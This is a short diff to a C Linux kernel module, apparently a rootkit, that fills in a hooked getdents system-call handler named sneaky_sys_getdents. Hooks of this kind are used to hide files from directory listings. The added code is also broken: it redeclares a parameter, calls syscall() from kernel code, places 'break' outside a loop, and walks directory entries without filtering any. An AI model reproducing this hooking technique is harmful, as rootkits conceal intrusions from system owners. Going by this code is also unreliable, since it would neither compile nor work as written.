@@ -57,6 +57,25 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
   printk(KERN_INFO "getting into sneaky_sys_getdents\n");
+  int fd, nread;
+  struct linux_dirent *d;
+
+    nread = syscall(original_getdents, fd, dirp, count);
+    if (nread == -1){
+      printk(KERN_INFO "error: cannot operate original getdents");
+    }
+    if (nread == 0){
+      break;
+    }
+   
+    for (int bpos = 0; bpos < nread;) {
+      d = (struct linux_dirent *) (dirp + bpos);
+      
+      bpos += d->d_reclen;
+    }
+  
+
+
 }
 
 //------------------read-------------------------/
